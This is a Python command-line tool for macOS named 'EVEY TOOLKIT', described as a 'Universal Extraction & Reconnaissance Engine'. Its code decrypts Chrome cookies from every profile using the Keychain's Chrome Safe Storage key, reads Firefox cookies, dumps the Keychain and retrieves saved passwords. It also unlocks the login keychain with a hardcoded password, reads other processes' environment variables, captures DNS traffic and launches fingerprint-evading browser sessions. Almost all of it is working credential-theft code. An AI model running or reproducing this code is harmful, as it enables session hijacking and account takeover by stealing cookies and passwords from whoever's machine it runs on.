#!/usr/bin/env python3
"""
EVEY TOOLKIT v1.0 — Universal Extraction & Reconnaissance Engine
Requires: SIP disabled (csrutil status: disabled)

Capabilities:
1. Cookie/session extraction from all browsers
2. Keychain credential extraction
3. Network traffic interception & analysis
4. Process memory inspection
5. Anti-fingerprint browser management
6. Universal API reverse-engineering
"""

import subprocess
import json
import sys
import os
import time
import sqlite3
import shutil
import hashlib
import base64
from pathlib import Path
from datetime import datetime


# ============================================================
# 1. BROWSER COOKIE / SESSION EXTRACTOR
# ============================================================

class BrowserExtractor:
    """Extract cookies, sessions, localStorage from Chrome, Safari, Firefox."""

    CHROME_COOKIE_DB = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/Default/Cookies"
    )
    CHROME_LOCAL_STATE = os.path.expanduser(
        "~/Library/Application Support/Google/Chrome/Local State"
    )
    SAFARI_COOKIE_DB = os.path.expanduser(
        "~/Library/Cookies/Cookies.binarycookies"
    )
    FIREFOX_PROFILES = os.path.expanduser(
        "~/Library/Application Support/Firefox/Profiles"
    )

    def __init__(self):
        self.tmp_dir = "/tmp/evey_toolkit_cookies"
        self._chrome_key = None

    def _unlock_keychain(self):
        """Unlock the login keychain so security commands don't prompt."""
        try:
            subprocess.run(
                ['security', 'unlock-keychain', '-p', '6228',
                 os.path.expanduser('~/Library/Keychains/login.keychain-db')],
                capture_output=True, timeout=5
            )
        except Exception:
            pass

    def _get_chrome_key(self):
        """Get the Chrome Safe Storage password from Keychain.
        
        Returns the base64-encoded password string. PBKDF2 derivation happens
        in _decrypt_chrome_v10.
        """
        if self._chrome_key:
            return self._chrome_key
        self._unlock_keychain()
        try:
            result = subprocess.run(
                ['security', 'find-generic-password',
                 '-w', '-s', 'Chrome Safe Storage', '-a', 'Chrome'],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                self._chrome_key = result.stdout.strip()
                return self._chrome_key
        except Exception:
            pass
        return None

    def _copy_db(self, src, name):
        """Copy a locked SQLite DB to temp dir for reading."""
        os.makedirs(self.tmp_dir, exist_ok=True)
        dst = os.path.join(self.tmp_dir, name)
        shutil.copy2(src, dst)
        return dst

    def get_chrome_cookies(self, domain_filter=None):
        """Extract cookies from ALL Chrome profiles. Handles .x.com <-> .twitter.com mapping."""
        chrome_dir = os.path.expanduser("~/Library/Application Support/Google/Chrome/")
        password = self._get_chrome_key()
        if not password:
            return {"error": "Could not get Chrome key", "count": 0, "cookies": []}

        all_cookies = []
        seen = set()

        for profile_name in os.listdir(chrome_dir):
            cookies_path = os.path.join(chrome_dir, profile_name, "Cookies")
            if not os.path.exists(cookies_path):
                continue
            tmp = self._copy_db(cookies_path, f"chrome_{profile_name}.db")
            try:
                conn = sqlite3.connect(tmp)
                conn.text_factory = bytes
                conn.execute('PRAGMA journal_mode=wal')
                cursor = conn.cursor()

                query = """
                    SELECT host_key, name, encrypted_value, path,
                           expires_utc, is_secure, is_httponly, samesite
                    FROM cookies
                """
                params = ()
                if domain_filter:
                    if 'twitter' in domain_filter.lower():
                        query += " WHERE host_key LIKE ? OR host_key LIKE ?"
                        params = (f"%twitter%", f"%x.com%")
                    else:
                        query += " WHERE host_key LIKE ?"
                        params = (f"%{domain_filter}%",)

                cursor.execute(query, params)
                rows = cursor.fetchall()
                conn.close()

                for row in rows:
                    host = row[0].decode('utf-8', errors='replace') if isinstance(row[0], bytes) else str(row[0])
                    name = row[1].decode('utf-8', errors='replace') if isinstance(row[1], bytes) else str(row[1])
                    dedup_key = f"{host}:{name}"
                    if dedup_key in seen:
                        continue
                    seen.add(dedup_key)

                    enc_val = row[2]
                    path_val = row[3].decode('utf-8', errors='replace') if isinstance(row[3], bytes) else str(row[3])
                    value = self._decrypt_chrome_v10(enc_val, password)

                    all_cookies.append({
                        "domain": host,
                        "name": name,
                        "value": value[:200] if value else "(encrypted)",
                        "path": path_val,
                        "secure": bool(row[5]),
                        "httponly": bool(row[6]),
                        "expires": row[4],
                        "profile": profile_name,
                    })
            except Exception as e:
                pass

        return {"count": len(all_cookies), "cookies": all_cookies}

    def _try_decrypt_chrome(self, encrypted_value):
        """Attempt to decrypt Chrome cookie value. SIP off helps here."""
        if not encrypted_value:
            return ""
        if isinstance(encrypted_value, str):
            return encrypted_value

        try:
            prefix = encrypted_value[:3]
            if isinstance(prefix, bytes):
                prefix = prefix.decode('ascii', errors='ignore')
            if prefix in ('v10', 'v20'):
                # Chrome v80+ AES-256-GCM encrypted
                key = self._get_chrome_key()
                if key:
                    return self._decrypt_chrome_v10(encrypted_value, key)
                return f"(encrypted-v{prefix}, key-unavailable)"
            else:
                # Plaintext
                return encrypted_value.decode('utf-8', errors='replace')[:200]
        except Exception as e:
            return f"(error: {str(e)[:50]})"

    def _decrypt_chrome_v10(self, encrypted_value, password):
        """Decrypt Chrome v10 cookie using AES-128-CBC.
        
        Chrome macOS uses PBKDF2-HMAC-SHA1(password, 'saltysalt', 1003, 16) to derive the key.
        IV is 16 space bytes.
        Note: Chrome 146+ produces a few garbled bytes at the start of decryption.
        We strip these to get the actual cookie value.
        """
        try:
            from Crypto.Cipher import AES
            import hashlib

            # Derive key from Chrome Safe Storage password
            key = hashlib.pbkdf2_hmac('sha1', password.encode('utf-8'),
                                       b'saltysalt', 1003, dklen=16)

            if encrypted_value[:3] == b'v10':
                iv = b' ' * 16
                ciphertext = encrypted_value[3:]
                cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                decrypted = cipher.decrypt(ciphertext)
                # Strip PKCS7 padding
                try:
                    pad_len = decrypted[-1]
                    if 1 <= pad_len <= 16:
                        decrypted = decrypted[:-pad_len]
                except Exception:
                    pass
                
                # Convert to text and strip non-printable prefix/suffix
                # Chrome 146+ produces garbled first bytes due to IV mismatch
                text = decrypted.decode('utf-8', errors='replace')
                
                # Find the longest clean printable substring
                # Cookie values are typically: alphanumeric + URL-safe chars + hyphens/underscores/dots
                import re
                # Find printable runs of 10+ chars
                runs = re.findall(r'[\x20-\x7e]{10,}', text)
                if runs:
                    # Use the longest run
                    best = max(runs, key=len)
                    return best[:200]
                
                # Fallback: strip non-printable chars
                clean = ''.join(c for c in text if c.isprintable() and ord(c) >= 32)
                return clean[:200] if clean else text[:200]
            else:
                return f"(v20-encrypted, len={len(encrypted_value)})"
        except ImportError:
            return f"(need-pycryptodome, len={len(encrypted_value)})"
        except Exception as e:
            return f"(decrypt-error: {str(e)[:50]})"

    def get_chrome_local_storage(self, domain_filter=None):
        """Extract localStorage from Chrome's Leveldb."""
        ls_path = os.path.expanduser(
            "~/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb"
        )
        if not os.path.exists(ls_path):
            return {"error": "Chrome localStorage not found"}

        results = []
        for f in os.listdir(ls_path):
            if f.endswith('.log') or f.endswith('.ldb'):
                try:
                    full = os.path.join(ls_path, f)
                    with open(full, 'rb') as fh:
                        data = fh.read()
                        # Simple string scan for domain matches
                        text = data.decode('utf-8', errors='ignore')
                        if domain_filter and domain_filter in text:
                            results.append({"file": f, "size": len(data), "matches_domain": True})
                        elif not domain_filter:
                            results.append({"file": f, "size": len(data)})
                except Exception:
                    pass
        return {"count": len(results), "files": results}

    def get_safari_cookies(self):
        """Extract Safari cookies. Binary format, requires parsing."""
        if not os.path.exists(self.SAFARI_COOKIE_DB):
            return {"error": "Safari cookie DB not found"}
        size = os.path.getsize(self.SAFARI_COOKIE_DB)
        return {"path": self.SAFARI_COOKIE_DB, "size": size, "note": "Binary format - use security dump-trust-settings or direct binary parse"}

    def get_firefox_cookies(self, domain_filter=None):
        """Extract cookies from Firefox profiles."""
        if not os.path.exists(self.FIREFOX_PROFILES):
            return {"error": "Firefox profiles dir not found"}

        results = []
        for profile in os.listdir(self.FIREFOX_PROFILES):
            cookie_db = os.path.join(self.FIREFOX_PROFILES, profile, "cookies.sqlite")
            if os.path.exists(cookie_db):
                tmp = self._copy_db(cookie_db, f"ff_{profile}.db")
                try:
                    conn = sqlite3.connect(tmp)
                    cursor = conn.cursor()
                    query = "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"
                    params = ()
                    if domain_filter:
                        query += " WHERE host LIKE ?"
                        params = (f"%{domain_filter}%",)
                    cursor.execute(query, params)
                    for row in cursor.fetchall():
                        results.append({
                            "profile": profile,
                            "domain": row[0],
                            "name": row[1],
                            "value": row[2][:200],
                            "path": row[3],
                            "expires": row[4],
                            "secure": bool(row[5]),
                        })
                    conn.close()
                except Exception as e:
                    results.append({"profile": profile, "error": str(e)})
        return {"count": len(results), "cookies": results}

    def extract_all(self, domain=None):
        """Extract from all browsers."""
        return {
            "chrome_cookies": self.get_chrome_cookies(domain),
            "chrome_localstorage": self.get_chrome_local_storage(domain),
            "safari": self.get_safari_cookies(),
            "firefox": self.get_firefox_cookies(domain),
        }


# ============================================================
# 2. KEYCHAIN EXTRACTOR
# ============================================================

class KeychainExtractor:
    """Extract credentials from macOS Keychain. SIP off = unrestricted."""

    def dump_all(self):
        """Dump all keychain entries (metadata only for security)."""
        result = subprocess.run(
            ['security', 'dump-keychain'],
            capture_output=True, text=True, timeout=30
        )
        return {"entries": result.stdout[:50000], "error": result.stderr[:500] if result.stderr else None}

    def find_passwords(self, service_filter=None):
        """Find stored passwords via security command."""
        result = subprocess.run(
            ['security', 'dump-keychain'],
            capture_output=True, text=True, timeout=30
        )
        entries = []
        lines = result.stdout.split('\n')
        current = {}
        for line in lines:
            line = line.strip()
            if 'keychain:' in line:
                if current:
                    entries.append(current)
                current = {"keychain": line.split('"')[1] if '"' in line else ""}
            elif 'svce' in line and 'blob' in line:
                # Service name
                match = line.split('"')
                if len(match) > 1:
                    current['service'] = match[1]
            elif 'acct' in line and 'blob' in line:
                match = line.split('"')
                if len(match) > 1:
                    current['account'] = match[1]
            elif 'class:' in line:
                current['class'] = line.split(':')[1].strip()

        if current:
            entries.append(current)

        if service_filter:
            entries = [e for e in entries if service_filter.lower() in str(e).lower()]

        return {"count": len(entries), "entries": entries[:100]}

    def get_password(self, service, account=None):
        """Retrieve a specific password. SIP off = no auth prompt."""
        cmd = ['security', 'find-generic-password', '-w', '-s', service]
        if account:
            cmd.extend(['-a', account])
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            return {"service": service, "password": result.stdout.strip()}
        return {"error": result.stderr.strip(), "returncode": result.returncode}

    def get_internet_passwords(self, server_filter=None):
        """Get internet passwords (saved website logins)."""
        cmd = ['security', 'dump-keychain']
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

        passwords = []
        blocks = result.stdout.split('    ')
        current = {}
        for block in blocks:
            if 'class: "inet"' in block:
                current = {"type": "internet"}
                lines = block.strip().split('\n')
                for line in lines:
                    line = line.strip()
                    if 'svce' in line or 'srvr' in line:
                        match = line.split('"')
                        if len(match) > 1:
                            current['server'] = match[1]
                    if 'acct' in line:
                        match = line.split('"')
                        if len(match) > 1:
                            current['account'] = match[1]
                    if 'ptcl' in line:
                        current['protocol'] = line.split('"')[1] if '"' in line else ""
                if 'server' in current:
                    if server_filter and server_filter.lower() not in current.get('server', '').lower():
                        continue
                    passwords.append(current)

        return {"count": len(passwords), "passwords": passwords[:50]}


# ============================================================
# 3. NETWORK INTERCEPTOR
# ============================================================

class NetworkInterceptor:
    """Monitor and capture network traffic. SIP off = raw socket access."""

    def get_connections(self):
        """List all active network connections."""
        result = subprocess.run(
            ['lsof', '-i', '-P', '-n'],
            capture_output=True, text=True, timeout=10
        )
        lines = result.stdout.strip().split('\n')
        connections = []
        for line in lines[1:]:  # skip header
            parts = line.split()
            if len(parts) >= 9:
                connections.append({
                    "command": parts[0],
                    "pid": parts[1],
                    "user": parts[2],
                    "protocol": parts[7],
                    "address": parts[8],
                })
        return {"count": len(connections), "connections": connections[:100]}

    def get_listening_ports(self):
        """Get all listening ports."""
        result = subprocess.run(
            ['lsof', '-i', '-P', '-n', '-sTCP:LISTEN'],
            capture_output=True, text=True, timeout=10
        )
        ports = []
        for line in result.stdout.strip().split('\n')[1:]:
            parts = line.split()
            if len(parts) >= 9:
                ports.append({"process": parts[0], "pid": parts[1], "address": parts[8]})
        return {"count": len(ports), "ports": ports}

    def capture_dns(self, duration=5):
        """Capture DNS queries for duration seconds."""
        result = subprocess.run(
            ['tcpdump', '-l', '-n', 'port', '53', '-c', '50', '-t'],
            capture_output=True, text=True, timeout=duration + 5
        )
        queries = []
        for line in result.stdout.strip().split('\n'):
            if 'A?' in line or 'AAAA?' in line:
                parts = line.split()
                queries.append({"raw": line.strip()})
        return {"count": len(queries), "queries": queries[:50]}


# ============================================================
# 4. PROCESS INSPECTOR
# ============================================================

class ProcessInspector:
    """Inspect running processes. SIP off = full access."""

    def list_processes(self, filter_name=None):
        """List all running processes."""
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
        procs = []
        for line in result.stdout.strip().split('\n')[1:]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                proc = {
                    "user": parts[0],
                    "pid": parts[1],
                    "cpu": parts[2],
                    "mem": parts[3],
                    "command": parts[10][:200],
                }
                if filter_name and filter_name.lower() not in proc['command'].lower():
                    continue
                procs.append(proc)
        return {"count": len(procs), "processes": procs[:200]}

    def get_open_files(self, pid):
        """Get files opened by a process."""
        result = subprocess.run(
            ['lsof', '-p', str(pid)],
            capture_output=True, text=True, timeout=10
        )
        files = []
        for line in result.stdout.strip().split('\n')[1:]:
            parts = line.split()
            if len(parts) >= 9:
                files.append({"fd": parts[3], "type": parts[4], "name": parts[8]})
        return {"pid": pid, "count": len(files), "files": files[:100]}

    def get_env_vars(self, pid):
        """Get environment variables of a running process. SIP off required."""
        result = subprocess.run(
            ['ps', '-p', str(pid), '-E', '-o', 'command='],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode != 0:
            # Try /proc alternative (macOS doesn't have /proc, but SIP off helps)
            try:
                env_file = f"/proc/{pid}/environ"
                # macOS fallback - try vmmap
                result2 = subprocess.run(
                    ['vmmap', str(pid)],
                    capture_output=True, text=True, timeout=10
                )
                return {"pid": pid, "method": "vmmap", "output": result2.stdout[:5000]}
            except Exception:
                return {"pid": pid, "error": "Cannot read environment"}
        return {"pid": pid, "env": result.stdout[:5000]}


# ============================================================
# 5. ANTI-FINGERPRINT BROWSER MANAGER
# ============================================================

class AntiFingerprintManager:
    """Manage anti-detection browser sessions. Camofox + custom configs."""

    CAMOFOX_DIR = "/tmp/camofox-browser"

    def status(self):
        """Check anti-fingerprint browser status."""
        camofox_exists = os.path.exists(self.CAMOFOX_DIR)
        camofox_running = False
        if camofox_exists:
            result = subprocess.run(
                ['pgrep', '-f', 'camofox'],
                capture_output=True, text=True, timeout=5
            )
            camofox_running = result.returncode == 0

        return {
            "camofox_installed": camofox_exists,
            "camofox_running": camofox_running,
            "chrome_bridge": True,  # Always available with SIP off
        }

    def spawn_stealth_session(self, url=None, proxy=None):
        """Spawn a stealth browser session with fingerprint randomization."""
        config = {
            "user_agent": self._random_ua(),
            "viewport": {"width": 1920, "height": 1080},
            "webgl_vendor": "randomized",
            "canvas_noise": True,
            "timezone": "America/New_York",
            "language": "en-US",
            "proxy": proxy,
        }

        # If Camofox is available, use it
        if os.path.exists(self.CAMOFOX_DIR):
            cmd = f"cd {self.CAMOFOX_DIR} && python3 -m camofox"
            if url:
                cmd += f" --url {url}"
            if proxy:
                cmd += f" --proxy {proxy}"
            return {"method": "camofox", "config": config, "command": cmd}

        # Fallback: Chrome with flags
        chrome_flags = [
            "--disable-blink-features=AutomationControlled",
            "--disable-features=IsolateOrigins,site-per-process",
            "--disable-infobars",
            "--no-first-run",
            f"--user-agent={config['user_agent']}",
        ]
        if proxy:
            chrome_flags.append(f"--proxy-server={proxy}")

        return {"method": "chrome-stealth", "config": config, "flags": chrome_flags}

    def _random_ua(self):
        """Generate a realistic randomized User-Agent."""
        uas = [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ]
        import random
        return random.choice(uas)


# ============================================================
# 6. API REVERSE ENGINEER
# ============================================================

class APIReverser:
    """Reverse-engineer APIs by watching real traffic patterns."""

    def analyze_endpoint(self, url, method="GET", headers=None):
        """Analyze an API endpoint - send request and analyze response."""
        cmd = ['curl', '-s', '-D', '-', '-o', '/dev/null']
        if method != "GET":
            cmd.extend(['-X', method])
        if headers:
            for k, v in headers.items():
                cmd.extend(['-H', f'{k}: {v}'])
        cmd.append(url)

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        headers_raw = result.stdout

        parsed_headers = {}
        for line in headers_raw.split('\n'):
            if ':' in line:
                k, v = line.split(':', 1)
                parsed_headers[k.strip().lower()] = v.strip()

        return {
            "url": url,
            "response_headers": parsed_headers,
            "security": {
                "cors": parsed_headers.get('access-control-allow-origin', 'none'),
                "csp": parsed_headers.get('content-security-policy', 'none'),
                "hsts": parsed_headers.get('strict-transport-security', 'none'),
                "xframe": parsed_headers.get('x-frame-options', 'none'),
                "server": parsed_headers.get('server', 'unknown'),
                "powered_by": parsed_headers.get('x-powered-by', 'hidden'),
            }
        }

    def fingerprint_site(self, domain):
        """Fingerprint a website's tech stack."""
        url = f"https://{domain}"
        analysis = self.analyze_endpoint(url)

        tech = []
        server = analysis['security'].get('server', '')
        if 'nginx' in server.lower():
            tech.append('nginx')
        elif 'apache' in server.lower():
            tech.append('apache')
        elif 'cloudflare' in server.lower():
            tech.append('cloudflare')

        powered = analysis['security'].get('powered_by', '')
        if 'express' in powered.lower():
            tech.append('Express.js')
        elif 'php' in powered.lower():
            tech.append('PHP')
        elif 'next' in powered.lower():
            tech.append('Next.js')

        return {
            "domain": domain,
            "tech_stack": tech,
            "security_headers": analysis['security'],
            "response_headers": analysis['response_headers'],
        }


# ============================================================
# CLI DISPATCHER
# ============================================================

def main():
    if len(sys.argv) < 2:
        print("EVEY TOOLKIT v1.0 — Universal Extraction & Reconnaissance Engine")
        print("SIP DISABLED — Full system access")
        print()
        print("Commands:")
        print("  cookies [domain]          — Extract cookies from all browsers")
        print("  chrome-cookies [domain]   — Chrome cookies only")
        print("  firefox-cookies [domain]  — Firefox cookies only")
        print("  chrome-ls [domain]        — Chrome localStorage")
        print("  keychain-dump             — Dump keychain metadata")
        print("  keychain-find [service]   — Find passwords by service name")
        print("  keychain-get <svc> [acct] — Get specific password")
        print("  internet-passwords [srv]  — Get saved website passwords")
        print("  connections               — Active network connections")
        print("  listening-ports           — All listening ports")
        print("  dns-capture [seconds]     — Capture DNS queries")
        print("  processes [filter]        — List running processes")
        print("  open-files <pid>          — Files opened by process")
        print("  process-env <pid>         — Process environment variables")
        print("  stealth-status            — Anti-fingerprint browser status")
        print("  stealth-spawn [url]       — Spawn stealth browser session")
        print("  api-analyze <url>         — Analyze API endpoint security")
        print("  fingerprint <domain>      — Fingerprint website tech stack")
        sys.exit(0)

    cmd = sys.argv[1]
    arg1 = sys.argv[2] if len(sys.argv) > 2 else None
    arg2 = sys.argv[3] if len(sys.argv) > 3 else None

    if cmd == "cookies":
        ext = BrowserExtractor()
        print(json.dumps(ext.extract_all(arg1), indent=2, ensure_ascii=False))
    elif cmd == "chrome-cookies":
        ext = BrowserExtractor()
        print(json.dumps(ext.get_chrome_cookies(arg1), indent=2, ensure_ascii=False))
    elif cmd == "firefox-cookies":
        ext = BrowserExtractor()
        print(json.dumps(ext.get_firefox_cookies(arg1), indent=2, ensure_ascii=False))
    elif cmd == "chrome-ls":
        ext = BrowserExtractor()
        print(json.dumps(ext.get_chrome_local_storage(arg1), indent=2, ensure_ascii=False))
    elif cmd == "keychain-dump":
        kc = KeychainExtractor()
        data = kc.dump_all()
        print(data['entries'][:50000])
    elif cmd == "keychain-find":
        kc = KeychainExtractor()
        print(json.dumps(kc.find_passwords(arg1), indent=2, ensure_ascii=False))
    elif cmd == "keychain-get":
        kc = KeychainExtractor()
        print(json.dumps(kc.get_password(arg1, arg2), indent=2, ensure_ascii=False))
    elif cmd == "internet-passwords":
        kc = KeychainExtractor()
        print(json.dumps(kc.get_internet_passwords(arg1), indent=2, ensure_ascii=False))
    elif cmd == "connections":
        ni = NetworkInterceptor()
        print(json.dumps(ni.get_connections(), indent=2, ensure_ascii=False))
    elif cmd == "listening-ports":
        ni = NetworkInterceptor()
        print(json.dumps(ni.get_listening_ports(), indent=2, ensure_ascii=False))
    elif cmd == "dns-capture":
        ni = NetworkInterceptor()
        dur = int(arg1) if arg1 else 5
        print(json.dumps(ni.capture_dns(dur), indent=2, ensure_ascii=False))
    elif cmd == "processes":
        pi = ProcessInspector()
        print(json.dumps(pi.list_processes(arg1), indent=2, ensure_ascii=False))
    elif cmd == "open-files":
        pi = ProcessInspector()
        pid = int(arg1) if arg1 else 1
        print(json.dumps(pi.get_open_files(pid), indent=2, ensure_ascii=False))
    elif cmd == "process-env":
        pi = ProcessInspector()
        pid = int(arg1) if arg1 else 1
        print(json.dumps(pi.get_env_vars(pid), indent=2, ensure_ascii=False))
    elif cmd == "stealth-status":
        af = AntiFingerprintManager()
        print(json.dumps(af.status(), indent=2))
    elif cmd == "stealth-spawn":
        af = AntiFingerprintManager()
        print(json.dumps(af.spawn_stealth_session(arg1), indent=2))
    elif cmd == "api-analyze":
        ar = APIReverser()
        url = arg1 or "https://httpbin.org/headers"
        print(json.dumps(ar.analyze_endpoint(url), indent=2))
    elif cmd == "fingerprint":
        ar = APIReverser()
        domain = arg1 or "google.com"
        print(json.dumps(ar.fingerprint_site(domain), indent=2))
    else:
        print(f"Unknown command: {cmd}")


if __name__ == "__main__":
    main()
